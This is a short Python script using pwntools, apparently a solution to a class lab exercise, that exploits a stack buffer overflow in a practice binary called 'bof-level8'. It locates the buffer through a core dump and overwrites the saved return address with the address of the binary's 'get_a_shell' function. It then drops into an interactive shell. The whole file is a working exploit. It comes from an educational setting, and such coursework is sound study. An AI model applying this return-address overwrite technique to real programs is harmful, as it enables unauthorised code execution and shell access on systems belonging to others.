#!/usr/bin/env python

# Heavily inspired by the in class script that was demonstrated in lab.

from pwn import *

p = process('./bof-level8', env={'ENVENVENV' : 'a'*200})

# sample buffer
buf = "A" * 0x80 + "\x00"


c = Core('./core')

buffer_addr = c.stack.find(buf)

e = ELF('./bof-level8')

addr_of_get_a_shell = e.symbols['get_a_shell']

buf = "A" * 16 + "BBBBBBBB" + p64(addr_of_get_a_shell)

buf = buf + "C" * (0x80 - len(buf))  + "\x00"

p.sendline(buf)

p.interactive()
